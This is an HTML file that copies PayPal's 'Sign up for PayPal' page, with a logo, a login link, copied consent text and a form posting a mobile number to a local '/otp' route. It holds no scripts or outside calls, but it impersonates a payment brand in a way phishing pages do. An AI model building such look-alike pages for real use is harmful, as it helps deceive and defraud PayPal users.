<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="signin.css">
    <title>Sign Up in Paypal</title>
</head>

<body>
    <div id="main-container">

        <div id="container">
            <div id="main-content">
                    <header><p>.</p><img src="./images/paypal-mark-color.svg" alt="img not found" draggable="false" width="35px" height="35px"><a
                            href="./login.html">Log In</a></header>
                    <form action="/otp" method="post" id="signin">
                        <span align="center">Sign up for PayPal</span>
                        <span align="center">First, add your mobile number</span>
                        <input type="number" name="number" id="number" placeholder="Mobile Number">
                        <p>By continuing, you confirm that you're the owner or primary user of this mobile phone number.
                            You
                            agree to receive automated SMS to confirm your phone number. Message and data rates may
                            apply.
                        </p>
                        <button type="submit">Next</button>
                    </form>
            </div>
        </div>
    </div>
</body>

</html>
